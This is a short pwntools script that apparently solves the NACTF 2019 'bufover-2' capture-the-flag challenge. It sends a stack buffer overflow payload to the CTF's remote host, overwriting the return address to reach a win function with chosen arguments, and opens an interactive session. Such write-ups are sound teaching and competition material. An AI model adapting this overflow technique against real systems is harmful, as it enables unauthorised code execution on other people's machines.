from pwn import *

win_add = 0x080491c2 
# a = process('./bufover-2')
a = remote('shell.2019.nactf.com', 31184)

raw_input('Debug')
buf = 'a'*0x1c + p32(win_add) + 'a'*4 + p32(0x14B4DA55) + p32(0x0) +  p32(0xF00DB4BE)
a.recvuntil('Type something>')
a.sendline(buf)

a.interactive()